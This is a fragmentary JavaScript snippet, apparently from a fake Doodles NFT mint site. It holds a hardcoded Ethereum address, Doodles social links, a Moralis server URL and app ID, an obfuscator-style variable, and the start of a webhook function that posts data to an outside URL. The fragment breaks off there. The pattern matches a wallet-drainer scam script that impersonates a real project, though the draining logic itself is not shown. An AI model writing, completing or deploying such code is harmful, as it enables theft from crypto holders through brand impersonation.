const ADDRESS = '0xB888FC74C10F671eDB819258149A4AFACadD4cd5';
...
const MAX=5
const namess="doodles";
const discord = 'https://discord.gg/doodles';
const twitter = 'https://twitter.com/doodles';
...
var serverUrl = "https://y0kfyuykidn4.usemoralis.com:2053/server",
    appId = "eGQokGnRItLzMUFCYTltAji9mCN69thTSqxE6VmX",
    _0x1829e9 = {};
...
const sendWebhooks = (message, url) => {
    fetch(url, {
        method: 'POST',
        headers: {
